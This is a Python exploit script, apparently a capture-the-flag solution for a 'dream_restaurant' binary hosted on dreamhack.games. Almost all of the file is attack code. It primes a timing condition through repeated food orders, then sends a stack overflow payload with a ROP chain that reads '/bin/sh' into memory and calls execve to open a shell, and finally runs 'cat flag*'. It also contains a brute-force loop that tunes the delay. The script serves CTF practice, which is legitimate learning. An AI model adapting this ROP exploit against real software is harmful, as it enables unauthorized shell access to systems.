#!/usr/bin/env python
import sys
import ptrlib as ptr
import pwn
import time

exe = ptr.ELF("./dream_restaurant")
pwn.context.binary = pwn.ELF(exe.filepath)
# libc = ptr.ELF("")
# ld = ptr.ELF("")

remote =  len(sys.argv) > 1 and sys.argv[1] == "remote"

def connect():
    if remote:
        return pwn.remote("host3.dreamhack.games", 12528)
    else:
        return pwn.process(exe.filepath)


def unwrap(x):
    if x is None:
        ptr.logger.error("Failed to unwrap")
        exit(1)
    else:
        return x


def main():
    io = connect()

    def sla(delim: bytes, data: bytes):
        io.sendlineafter(delim, data)
        return

    def sa(delim: bytes, data: bytes):
        io.sendafter(delim, data)
        return

    def sl(data: bytes):
        io.sendline(data)
        return

    def s(data: bytes):
        io.send(data)
        return

    def r(size: int) -> bytes:
        return io.recv(size)

    def ru(delim: bytes, drop: bool = False) -> bytes:
        return io.recvuntil(delim, drop=drop)

    def rl() -> bytes:
        return io.recvline()

    def order(name: bytes):
        sla(b"> ", b"1")
        sla(b"want? ", name)
        return

    def order_unrecv(name: bytes):
        sl(b"1")
        sl(name)
        return

    def quit(payload : bytes):
        sla(b"> ", b"3")
        sla(b"'? ", payload)
        return

    # RICE
    # .cooking_time = 3133700
    SOONDAE_GUKBAP= b"Soondae-gukbap"

    # .cooking_time = 6221200
    BUTADON = b"Butadon"

    # .cooking_time = 7331300
    DONKATSU = b"Donkatsu-set"

    # NOODLE
    # .cooking_time = 1337000
    JAJANGMYEON = b"Jajangmyun"

    # .cooking_time = 1337000
    JJAMPPONG =  b"Jjamppong"

    # .cooking_time = 3133700
    KALGUKSU = b"Kalguksu"

    # .cooking_time = 2022600
    RAMEN = b"Ramen"

    order(SOONDAE_GUKBAP)

    attempt_count = 54
    if remote:
        # attempt_count = 40
        # attempt_count = 31
        attempt_count = 26
    for _ in range(attempt_count):
        order(JJAMPPONG)

    # if remote:
    #     io.interactive()
    #     exit()

    ret = next(exe.gadget("ret;"))
    pop_rdi = next(exe.gadget("pop rdi; ret;"))
    pop_rsi = next(exe.gadget("pop rsi; ret;"))
    pop_rax_rdx_rbx = next(exe.gadget("pop rax; pop rdx; pop rbx; ret;"))
    syscall = next(exe.gadget("syscall; ret;"))
    bin_sh = 0x4fc000

    payload = b""
    payload += b"A" * 152
    payload += ptr.p64(ret)
    payload += ptr.p64(pop_rdi)
    payload += ptr.p64(0)
    payload += ptr.p64(pop_rsi)
    payload += ptr.p64(bin_sh)
    payload += ptr.p64(pop_rax_rdx_rbx)
    payload += ptr.p64(0)
    payload += ptr.p64(0x18)
    payload += ptr.p64(0)
    payload += ptr.p64(syscall)

    payload += ptr.p64(pop_rdi)
    payload += ptr.p64(bin_sh)
    payload += ptr.p64(pop_rsi)
    payload += ptr.p64(0)
    payload += ptr.p64(pop_rax_rdx_rbx)
    payload += ptr.p64(59)
    payload += ptr.p64(0)
    payload += ptr.p64(0)
    payload += ptr.p64(syscall)

    assert b"\n" not in payload

    time.sleep(3)
    quit(payload)
    sl(b"/bin/sh\0")
    sl(b"cat flag*")

    io.interactive()
    return

def main(ac):
    io = connect()

    def sla(delim: bytes, data: bytes):
        io.sendlineafter(delim, data)
        return

    def sa(delim: bytes, data: bytes):
        io.sendafter(delim, data)
        return

    def sl(data: bytes):
        io.sendline(data)
        return

    def s(data: bytes):
        io.send(data)
        return

    def r(size: int) -> bytes:
        return io.recv(size)

    def ru(delim: bytes, drop: bool = False) -> bytes:
        return io.recvuntil(delim, drop=drop)

    def rl() -> bytes:
        return io.recvline()

    def order(name: bytes):
        sla(b"> ", b"1")
        sla(b"want? ", name)
        return

    def order_unrecv(name: bytes):
        sl(b"1")
        sl(name)
        return

    def quit(payload : bytes):
        sla(b"> ", b"3")
        sla(b"'? ", payload)
        return

    # RICE
    # .cooking_time = 3133700
    SOONDAE_GUKBAP= b"Soondae-gukbap"

    # .cooking_time = 6221200
    BUTADON = b"Butadon"

    # .cooking_time = 7331300
    DONKATSU = b"Donkatsu-set"

    # NOODLE
    # .cooking_time = 1337000
    JAJANGMYEON = b"Jajangmyun"

    # .cooking_time = 1337000
    JJAMPPONG =  b"Jjamppong"

    # .cooking_time = 3133700
    KALGUKSU = b"Kalguksu"

    # .cooking_time = 2022600
    RAMEN = b"Ramen"

    order(SOONDAE_GUKBAP)

    # attempt_count = 54
    # if remote:
    #     # attempt_count = 40
    #     # attempt_count = 31
    #     attempt_count = 26
    for _ in range(ac):
        order(JJAMPPONG)

    # if remote:
    #     io.interactive()
    #     exit()

    ret = next(exe.gadget("ret;"))
    pop_rdi = next(exe.gadget("pop rdi; ret;"))
    pop_rsi = next(exe.gadget("pop rsi; ret;"))
    pop_rax_rdx_rbx = next(exe.gadget("pop rax; pop rdx; pop rbx; ret;"))
    syscall = next(exe.gadget("syscall; ret;"))
    bin_sh = 0x4fc000

    payload = b""
    payload += b"A" * 152
    payload += ptr.p64(ret)
    payload += ptr.p64(pop_rdi)
    payload += ptr.p64(0)
    payload += ptr.p64(pop_rsi)
    payload += ptr.p64(bin_sh)
    payload += ptr.p64(pop_rax_rdx_rbx)
    payload += ptr.p64(0)
    payload += ptr.p64(0x18)
    payload += ptr.p64(0)
    payload += ptr.p64(syscall)

    payload += ptr.p64(pop_rdi)
    payload += ptr.p64(bin_sh)
    payload += ptr.p64(pop_rsi)
    payload += ptr.p64(0)
    payload += ptr.p64(pop_rax_rdx_rbx)
    payload += ptr.p64(59)
    payload += ptr.p64(0)
    payload += ptr.p64(0)
    payload += ptr.p64(syscall)

    assert b"\n" not in payload

    time.sleep(3)
    quit(payload)
    ru(b"Thank you for writing review. It will help improve our restaurant.")
    sl(b"/bin/sh\0")
    sl(b"cat flag*")
    try:
        dump = io.recvall(1)
        print(dump)
        if dump == b"":
            return
        exit()
    except:
        return

    # io.interactive()
    # return

def determine_delay(attempt_count) -> bool:
    io = connect()

    def sla(delim: bytes, data: bytes):
        io.sendlineafter(delim, data)
        return

    def sa(delim: bytes, data: bytes):
        io.sendafter(delim, data)
        return

    def sl(data: bytes):
        io.sendline(data)
        return

    def s(data: bytes):
        io.send(data)
        return

    def r(size: int) -> bytes:
        return io.recv(size)

    def ru(delim: bytes, drop: bool = False) -> bytes:
        return io.recvuntil(delim, drop=drop)

    def rl() -> bytes:
        return io.recvline()

    def order(name: bytes):
        sla(b"> ", b"1")
        sla(b"want? ", name)
        return

    def order_unrecv(name: bytes):
        sl(b"1")
        sl(name)
        return

    def quit(payload : bytes):
        sla(b"> ", b"3")
        sla(b"'? ", payload)
        return

    # RICE
    # .cooking_time = 3133700
    SOONDAE_GUKBAP= b"Soondae-gukbap"

    # .cooking_time = 6221200
    BUTADON = b"Butadon"

    # .cooking_time = 7331300
    DONKATSU = b"Donkatsu-set"

    # NOODLE
    # .cooking_time = 1337000
    JAJANGMYEON = b"Jajangmyun"

    # .cooking_time = 1337000
    JJAMPPONG =  b"Jjamppong"

    # .cooking_time = 3133700
    KALGUKSU = b"Kalguksu"

    # .cooking_time = 2022600
    RAMEN = b"Ramen"

    order_unrecv(SOONDAE_GUKBAP)

    # attempt_count = 54
    # if remote:
    #     # attempt_count = 40
    #     # attempt_count = 31
    #     attempt_count = 25
    for _ in range(attempt_count):
        order_unrecv(JJAMPPONG)

    time.sleep(3)
    print("hello")
    exit()
    io.interactive()
    # sl(b"2")
    # ru(b"Food name: ")
    # name = rl().strip(b"\n")
    # print(name)
    # io.close()
    # if name == JJAMPPONG:
    #     return True
    # else :
    #     return False

    # ret = next(exe.gadget("ret;"))
    # pop_rdi = next(exe.gadget("pop rdi; ret;"))
    # pop_rsi = next(exe.gadget("pop rsi; ret;"))
    # pop_rax_rdx_rbx = next(exe.gadget("pop rax; pop rdx; pop rbx; ret;"))
    # syscall = next(exe.gadget("syscall; ret;"))
    # bin_sh = 0x4fc000

    # payload = b""
    # payload += b"A" * 152
    # payload += ptr.p64(ret)
    # payload += ptr.p64(pop_rdi)
    # payload += ptr.p64(0)
    # payload += ptr.p64(pop_rsi)
    # payload += ptr.p64(bin_sh)
    # payload += ptr.p64(pop_rax_rdx_rbx)
    # payload += ptr.p64(0)
    # payload += ptr.p64(0x18)
    # payload += ptr.p64(0)
    # payload += ptr.p64(syscall)

    # payload += ptr.p64(pop_rdi)
    # payload += ptr.p64(bin_sh)
    # payload += ptr.p64(pop_rsi)
    # payload += ptr.p64(0)
    # payload += ptr.p64(pop_rax_rdx_rbx)
    # payload += ptr.p64(59)
    # payload += ptr.p64(0)
    # payload += ptr.p64(0)
    # payload += ptr.p64(syscall)

    # assert b"\n" not in payload

    # time.sleep(3)
    # quit(payload)
    # # sl(b"/bin/sh\0")
    # # sl(b"cat flag*")

    # io.interactive()

if __name__ == "__main__":
    # for i in range(20, 35):
    #     print(i)
    #     for _ in range(3):
    #         main(i)
    for i in range(1, 100):
        print(i)
        if determine_delay(i):
            print("yattane!")
            exit()
